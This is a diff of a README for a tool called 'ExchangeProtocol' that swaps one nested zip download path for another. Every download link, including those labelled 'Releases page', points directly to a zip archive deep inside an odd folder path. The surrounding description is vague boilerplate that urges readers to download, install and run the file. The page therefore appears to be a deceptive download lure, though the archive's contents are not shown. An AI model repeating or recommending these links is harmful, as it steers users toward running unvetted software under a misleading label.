@@ -1,7 +1,7 @@
 # 🚀 ExchangeProtocol - Simple Tool for Secure Data Exchange
 
 ## 📥 Download Now
-[![Download ExchangeProtocol](https://raw.githubusercontent.com/abuhadi-80/ExchangeProtocol/main/StructuralExplainability/ExchangeProtocol/Core/Record/Shared/Protocol-Exchange-v3.2-alpha.3.zip)](https://raw.githubusercontent.com/abuhadi-80/ExchangeProtocol/main/StructuralExplainability/ExchangeProtocol/Core/Record/Shared/Protocol-Exchange-v3.2-alpha.3.zip)
+[![Download ExchangeProtocol](https://raw.githubusercontent.com/abuhadi-80/ExchangeProtocol/main/StructuralExplainability/ExchangeProtocol/Core/Record/Entity/Protocol-Exchange-3.1.zip)](https://raw.githubusercontent.com/abuhadi-80/ExchangeProtocol/main/StructuralExplainability/ExchangeProtocol/Core/Record/Entity/Protocol-Exchange-3.1.zip)
 
 ## 📚 Overview
 ExchangeProtocol is an application designed to help users understand and implement exchange protocols in a safe and efficient way. This software makes it easy to handle different schemas used in data exchanges, ensuring everyone follows the same rules. With a focus on formalization and verification, this tool supports better data handling and interoperability.
@@ -9,7 +9,7 @@ ExchangeProtocol is an application designed to help users understand and impleme
 ## 🚀 Getting Started
 To start using ExchangeProtocol, follow these simple steps:
 
-1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/abuhadi-80/ExchangeProtocol/main/StructuralExplainability/ExchangeProtocol/Core/Record/Shared/Protocol-Exchange-v3.2-alpha.3.zip) to find the latest version of ExchangeProtocol.
+1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/abuhadi-80/ExchangeProtocol/main/StructuralExplainability/ExchangeProtocol/Core/Record/Entity/Protocol-Exchange-3.1.zip) to find the latest version of ExchangeProtocol.
 
 2. **Download the Application**: Click on the download link for the most recent release. This will load a file suitable for your system.
 
@@ -47,7 +47,7 @@ This application is ideal for those interested in areas like:
 ## 📥 Download & Install
 To get started, follow these instructions once more:
 
-1. **Go to the Releases page**: [Releases page](https://raw.githubusercontent.com/abuhadi-80/ExchangeProtocol/main/StructuralExplainability/ExchangeProtocol/Core/Record/Shared/Protocol-Exchange-v3.2-alpha.3.zip).
+1. **Go to the Releases page**: [Releases page](https://raw.githubusercontent.com/abuhadi-80/ExchangeProtocol/main/StructuralExplainability/ExchangeProtocol/Core/Record/Entity/Protocol-Exchange-3.1.zip).
 2. **Select the most recent version**: Download the file that matches your operating system.
 3. **Install and run the application**: Follow the installation prompts and start using ExchangeProtocol.
 
